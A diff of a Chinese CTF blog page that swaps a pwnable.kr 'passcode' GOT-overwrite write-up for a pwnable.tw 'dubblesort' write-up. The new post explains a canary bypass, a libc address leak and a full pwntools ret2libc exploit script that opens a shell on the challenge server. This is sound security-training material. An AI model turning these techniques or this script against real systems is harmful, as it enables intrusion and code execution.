@@ -79,24 +79,32 @@
 
 
 
-<meta name="description" content="12345678910111213141516171819202122232425262728293031323334353637383940414243#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void login()&amp;#123;	int passcode1;	int passcode2;	printf(&quot;enter passcode1 :">
+<meta name="description" content="Canary（栈保护） 这个选项表示栈保护功能有没有开启。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。  所以在这里，把gs:14h放">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pwnable Passcode">
-<meta property="og:url" content="http://yaqing.site/2017/09/13/passcode/index.html">
+<meta property="og:title" content="Pwnable.tw dubblesort">
+<meta property="og:url" content="http://yaqing.site/2018/09/03/20180829/index.html">
 <meta property="og:site_name" content="洋葱">
-<meta property="og:description" content="12345678910111213141516171819202122232425262728293031323334353637383940414243#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void login()&amp;#123;	int passcode1;	int passcode2;	printf(&quot;enter passcode1 :">
-<meta property="og:image" content="http://osuzegp2h.bkt.clouddn.com/3.1.png">
-<meta property="og:image" content="http://osuzegp2h.bkt.clouddn.com/3.2.png">
-<meta property="og:image" content="http://osuzegp2h.bkt.clouddn.com/3.5.png">
-<meta property="og:image" content="http://osuzegp2h.bkt.clouddn.com/3.6.png">
-<meta property="og:image" content="http://osuzegp2h.bkt.clouddn.com/3.4.png">
-<meta property="og:image" content="http://osuzegp2h.bkt.clouddn.com/3.7.png">
-<meta property="og:image" content="http://osuzegp2h.bkt.clouddn.com/3.8.png">
-<meta property="og:updated_time" content="2017-11-01T06:47:50.677Z">
+<meta property="og:description" content="Canary（栈保护） 这个选项表示栈保护功能有没有开启。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。  所以在这里，把gs:14h放">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1fuqbvrre51j20oj02yq2v.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1fuqkq923guj20th0kbdgw.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1fuql514b2uj20su0l3wfd.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1fuqly58e8cj20l403pq36.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1fuqlykconsj20k2037q37.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1fuqou8f31aj20l803bq2z.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1fuqow7d95mj20hc06qdgg.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1fuqovjmha6j20m703k3ym.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1furik31c4hj20my02gaa4.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1furipjbiuzj20ku0790ul.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1fuw4s5k7doj20mf0a4403.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1fuw598uymtj20ec07h76n.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1fuw6c64recj20kz07l0vz.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1fuw6effsqdj20ks05xdh6.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/72105478gy1fuwbrdj0vij20mt0m4jwa.jpg">
+<meta property="og:updated_time" content="2018-09-03T08:24:15.261Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Pwnable Passcode">
-<meta name="twitter:description" content="12345678910111213141516171819202122232425262728293031323334353637383940414243#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void login()&amp;#123;	int passcode1;	int passcode2;	printf(&quot;enter passcode1 :">
-<meta name="twitter:image" content="http://osuzegp2h.bkt.clouddn.com/3.1.png">
+<meta name="twitter:title" content="Pwnable.tw dubblesort">
+<meta name="twitter:description" content="Canary（栈保护） 这个选项表示栈保护功能有没有开启。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。  所以在这里，把gs:14h放">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/72105478gy1fuqbvrre51j20oj02yq2v.jpg">
 
 
 
@@ -126,13 +134,13 @@
 
 
 
-  <link rel="canonical" href="http://yaqing.site/2017/09/13/passcode/"/>
+  <link rel="canonical" href="http://yaqing.site/2018/09/03/20180829/"/>
 
 
 
 
 
-  <title>Pwnable Passcode | 洋葱</title>
+  <title>Pwnable.tw dubblesort | 洋葱</title>
   
 
 
@@ -239,7 +247,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yaqing.site/2017/09/13/passcode/">
+    <link itemprop="mainEntityOfPage" href="http://yaqing.site/2018/09/03/20180829/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="洋葱">
@@ -256,7 +264,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Pwnable Passcode</h1>
+          <h1 class="post-title" itemprop="name headline">Pwnable.tw dubblesort</h1>
         
 
         <div class="post-meta">
@@ -268,8 +276,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-13T21:45:50+08:00">
-                Sep 13 2017
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-03T16:24:15+08:00">
+                Sep 3 2018
               </time>
             
 
@@ -287,8 +295,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/09/13/passcode/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count gitment-comments-count" data-xid="/2017/09/13/passcode/" itemprop="commentsCount"></span>
+                <a href="/2018/09/03/20180829/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2018/09/03/20180829/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -296,7 +304,7 @@
 
           
           
-             <span id="/2017/09/13/passcode/" class="leancloud_visitors" data-flag-title="Pwnable Passcode">
+             <span id="/2018/09/03/20180829/" class="leancloud_visitors" data-flag-title="Pwnable.tw dubblesort">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -321,7 +329,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  550 字
+                  842 字
                 </span>
               
 
@@ -337,7 +345,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2 分钟
+                  3 分钟
                 </span>
               
             </div>
@@ -358,20 +366,18 @@
       
 
       
-        <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> passcode1;</div><div class="line">	<span class="keyword">int</span> passcode2;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);		<span class="comment">//没有&amp;</span></div><div class="line">	fflush(<span class="built_in">stdin</span>);</div><div class="line"></div><div class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);		<span class="comment">//没有&amp;</span></div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</div><div class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</div><div class="line">                system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</div><div class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);	<span class="comment">//输入name长度有100这么长</span></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</div><div class="line"></div><div class="line">	welcome();</div><div class="line">	login();</div><div class="line"></div><div class="line">	<span class="comment">// something after login...</span></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>给了源代码如上，涉及到的漏洞就是<code>scanf</code>没有加”&amp;”。    </p>
-<p>涉及到的知识点：①<code>scanf</code>如果没有加”&amp;”的话，默认会取栈上的数据当作是地址。②got表可以修改的，got表上某函数的地址上的内容可以修改成别的内容。    </p>
-<p>这题的解题思路大致是：<code>name</code>长度为100，<code>name</code>和<code>passcode</code>都在同一个栈上，而且<code>passcode1</code>的地址刚好在<code>name</code>的最后4个字节上面，所以可以把<code>passcode1</code>的地址改写成got表内某个函数地址，并且向<code>scanf</code>的另一个参数”%d”打入<code>system(&quot;/bin/cat flag&quot;)</code>的地址，从而得到flag。    </p>
-<p>分析：    </p>
-<p><img src="http://osuzegp2h.bkt.clouddn.com/3.1.png" alt="images"><br><code>welcome</code>里面<code>name</code>在栈上地址是<code>ebp-0x70</code>的位置    </p>
-<p><img src="http://osuzegp2h.bkt.clouddn.com/3.2.png" alt="images"><br><code>login</code>里面<code>passcode1</code>在栈上地址是<code>ebp-0x10</code>(之后都用intel语体）    </p>
-<p><img src="http://osuzegp2h.bkt.clouddn.com/3.5.png" alt="images">    </p>
-<p><img src="http://osuzegp2h.bkt.clouddn.com/3.6.png" alt="images"><br>可以看到<code>welcome</code>和<code>login</code>是共同用一个栈的。所以<code>name</code>和<code>passcode1</code>之间的距离是0x60，也就是96个字节，<code>name</code>的标准长度是100，也就是说<code>name</code>的最后四个字节刚好是<code>passcode1</code>的地址。这样就可以利用第二个知识点，把got表内任意的函数地址找出来修改此地址上的内容，这里我选择的是<code>printf</code>函数。    </p>
-<p><img src="http://osuzegp2h.bkt.clouddn.com/3.4.png" alt="images">    </p>
-<p>接下来就是要修改到哪里的问题。从代码中我们可以看到我们需要跳到<code>system</code>里面去执行，所以我们找到这个函数的地址。<br><img src="http://osuzegp2h.bkt.clouddn.com/3.7.png" alt="images"><br>这样我们把这个地址当作”%d”，把<code>printf</code>函数在got表内的地址当作&amp;passcode1，从而修改了got表上原本<code>printf</code>函数地址上的内容，转去执行<code>system</code>。    </p>
-<p><img src="http://osuzegp2h.bkt.clouddn.com/3.8.png" alt="images">    </p>
-<p>参考资料：<br><a href="http://blog.csdn.net/linyt/article/details/51635768" target="_blank" rel="external">http://blog.csdn.net/linyt/article/details/51635768</a><br><a href="https://hacpai.com/article/1484036087308" target="_blank" rel="external">https://hacpai.com/article/1484036087308</a><br><a href="http://blog.csdn.net/smalosnail/article/details/53247502?_t_t_t=0.050024056468489064" target="_blank" rel="external">http://blog.csdn.net/smalosnail/article/details/53247502?_t_t_t=0.050024056468489064</a><br><a href="http://blog.csdn.net/qq_20307987/article/details/51303824" target="_blank" rel="external">http://blog.csdn.net/qq_20307987/article/details/51303824</a>    </p>
-
+        <h4 id="Canary（栈保护）"><a href="#Canary（栈保护）" class="headerlink" title="Canary（栈保护）"></a>Canary（栈保护）</h4><blockquote>
+<p>这个选项表示栈保护功能有没有开启。<br>当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
+</blockquote>
+<p>所以在这里，把<code>gs:14h</code>放到<code>esp+7Ch</code>上，等到函数返回的时候检查栈上这个位置的值，从而防止栈溢出攻击。<img src="http://ww1.sinaimg.cn/large/72105478gy1fuqbvrre51j20oj02yq2v.jpg" alt=""></p>
+<h4 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a><code>readelf</code></h4><p>用来显示一个或多个<code>elf</code>格式的目标文件信息，通过控制选项来控制显示的信息。</p>
+<h4 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a><code>objdump</code></h4><p>用来查看目标文件的构成的<code>gcc</code>工具  </p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="http://ww1.sinaimg.cn/large/72105478gy1fuqkq923guj20th0kbdgw.jpg" alt=""><br>这个程序逻辑比较简单，输入名字，然后输入要排序的大小，输入数字然后开始用冒泡排序法开始排序。洞也很好找，这些来排序的数放在栈上，但是没有限制数量，所以会导致栈溢出。其中要注意的是程序开启了栈保护，所以我们在溢出的时候需要绕过<code>canary</code>。另外，还给我们了一个<code>libc_32.so.6</code>，所以我们可以确定用<code>ret2libc</code>来进行攻击。<br><a id="more"></a></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过<code>canary</code></h3><p>先来想怎么绕过<code>canary</code>。<br><code>gs:14</code>是放在<code>esp+7Ch</code>的位置，而我们<code>input_array</code>是在<code>esp+1Ch</code>的位置。所以画图看得明白（我还是觉得在初学的时候多画图，思路会更清晰）:<img src="http://ww1.sinaimg.cn/large/72105478gy1fuql514b2uj20su0l3wfd.jpg" alt="">所以，我们必须得保证<code>canary</code>不被修改。这个是可以试出来的，正常输入4，3，2，1：<br><img src="http://ww1.sinaimg.cn/large/72105478gy1fuqly58e8cj20l403pq36.jpg" alt=""><br>排序之后：<br><img src="http://ww1.sinaimg.cn/large/72105478gy1fuqlykconsj20k2037q37.jpg" alt=""><br>如果我们要绕过<code>canary</code>，也就是说明，<code>esp+7Ch</code>的位置不能变，我们只要保证输入之后，输入的字符不改变栈上的值就OK了。<br>经过测试，输入<code>&quot;+&quot;</code>可以不改变栈上的值。<br>测试一下：<br>没有输入的时候栈上的值：<br><img src="http://ww1.sinaimg.cn/large/72105478gy1fuqou8f31aj20l803bq2z.jpg" alt=""><br>输入完：<br><img src="http://ww1.sinaimg.cn/large/72105478gy1fuqow7d95mj20hc06qdgg.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/72105478gy1fuqovjmha6j20m703k3ym.jpg" alt=""><br>可以看到确实，<code>number[0]</code>处的栈上值没有发生改变。所以这种绕过是成功的。</p>
+<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a><code>ret2libc</code></h3><p>因为给了<code>libc.so.6</code>，所以我们可以利用<code>ret2libc</code>来执行<code>system(&quot;/bin/sh&quot;)</code>。有了<code>so</code>文件就很好获取到<code>libc</code>中<code>system</code>和<code>/bin/sh</code>的<code>offset</code>。<br><img src="http://ww1.sinaimg.cn/large/72105478gy1furik31c4hj20my02gaa4.jpg" alt=""><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexdump -C ./libc_32.so<span class="number">.6</span> | grep /bin -A <span class="number">2</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://ww1.sinaimg.cn/large/72105478gy1furipjbiuzj20ku0790ul.jpg" alt=""></p>
+<p>偏移地址有了，还需要<code>libc</code>的基地址。通过<code>gdb</code>可以看到<code>libc</code>的地址范围。<br><img src="http://ww1.sinaimg.cn/large/72105478gy1fuw4s5k7doj20mf0a4403.jpg" alt=""><br>接下来就要考虑程序有没有可以泄露栈上地址的地方，可以看到在程序一开始的时候，有一个输入<code>name</code>的操作，会打印处一些不可见的字符串。<br><img src="http://ww1.sinaimg.cn/large/72105478gy1fuw598uymtj20ec07h76n.jpg" alt=""><br><code>gdb</code>下断点调一下：<br><img src="http://ww1.sinaimg.cn/large/72105478gy1fuw6c64recj20kz07l0vz.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/72105478gy1fuw6effsqdj20ks05xdh6.jpg" alt=""><br>应该是遇到<code>0xa</code>然后换行打印了后遇到<code>0x0</code>结尾。可以看到这栈上面的信息，对比一下上面，发现<code>0xf7fc7000</code>就是<code>libc</code>内的地址。偏移地址是<code>0x1b0000</code>：<br><img src="http://ww1.sinaimg.cn/large/72105478gy1fuwbrdj0vij20mt0m4jwa.jpg" alt=""></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level=<span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="comment">#pro=process("./dubblesort")</span></div><div class="line">pro=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10101</span>)</div><div class="line"></div><div class="line">got_offset=<span class="number">0x1b0000</span></div><div class="line">sys_offset=<span class="number">0x3A940</span></div><div class="line">bin_offset=<span class="number">0X158E8B</span></div><div class="line"></div><div class="line">pro.recvuntil(<span class="string">"your name :"</span>)</div><div class="line">payload=<span class="string">"A"</span>*<span class="number">24</span></div><div class="line">pro.sendline(payload)</div><div class="line">libc_addr=u32(pro.recv()[<span class="number">30</span>:<span class="number">34</span>])<span class="number">-0xa</span></div><div class="line"><span class="keyword">print</span> <span class="string">"libc_addr: "</span>,hex(libc_addr)</div><div class="line"></div><div class="line">libc_base=libc_addr-got_offset</div><div class="line">sys_addr=libc_base+sys_offset</div><div class="line">bin_addr=libc_base+bin_offset</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"sys_addr:"</span>,hex(sys_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"bin_addr:"</span>,hex(bin_addr)</div><div class="line"></div><div class="line">size=<span class="number">0x18</span>+<span class="number">1</span>+<span class="number">8</span>+<span class="number">1</span>+<span class="number">1</span></div><div class="line">pro.sendline(str(size))</div><div class="line">pro.recv()</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x18</span>):</div><div class="line">	pro.sendline(<span class="string">"1"</span>)</div><div class="line">	pro.recv()</div><div class="line"></div><div class="line">pro.sendline(<span class="string">"+"</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</div><div class="line">	pro.sendline(str(sys_addr))</div><div class="line">	pro.recv()</div><div class="line"></div><div class="line">pro.sendline(str(bin_addr))</div><div class="line">pro.recv()</div><div class="line">pro.interactive()</div></pre></td></tr></table></figure>
       
     </div>
     
@@ -419,8 +425,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/09/13/leg/" rel="next" title="Pwnable Leg">
-                <i class="fa fa-chevron-left"></i> Pwnable Leg
+              <a href="/2018/08/24/20180824/" rel="next" title="C语言之指针相关的小问题">
+                <i class="fa fa-chevron-left"></i> C语言之指针相关的小问题
               </a>
             
           </div>
@@ -428,10 +434,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/09/13/shellshock/" rel="prev" title="Pwnable Shellshock">
-                Pwnable Shellshock <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -490,8 +492,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -533,6 +544,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Canary（栈保护）"><span class="nav-number">1.</span> <span class="nav-text">Canary（栈保护）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#readelf"><span class="nav-number">2.</span> <span class="nav-text">readelf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#objdump"><span class="nav-number">3.</span> <span class="nav-text">objdump</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number"></span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number"></span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过canary"><span class="nav-number"></span> <span class="nav-text">绕过canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc"><span class="nav-number"></span> <span class="nav-text">ret2libc</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
